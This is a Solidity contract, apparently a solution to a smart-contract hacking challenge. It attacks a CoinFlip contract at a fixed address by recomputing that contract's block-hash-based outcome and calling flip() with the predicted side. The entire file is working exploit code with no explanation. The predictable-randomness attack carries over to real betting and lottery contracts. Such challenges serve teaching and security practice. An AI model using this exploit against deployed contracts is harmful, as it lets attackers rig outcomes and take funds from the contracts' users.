contract hackCoinFlip {
    
  CoinFlip public coinContract = CoinFlip(0x60aC4556423Bf80fe3E270264e79Ed79EA7b6E79);
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  
  constructor(bool _guess) public {
    uint256 blockValue = uint256(blockhash(block.number-1));
    uint256 coinFlip = blockValue/FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
     coinContract.flip(_guess);
    } else {
     coinContract.flip(!_guess);
    }
  }
}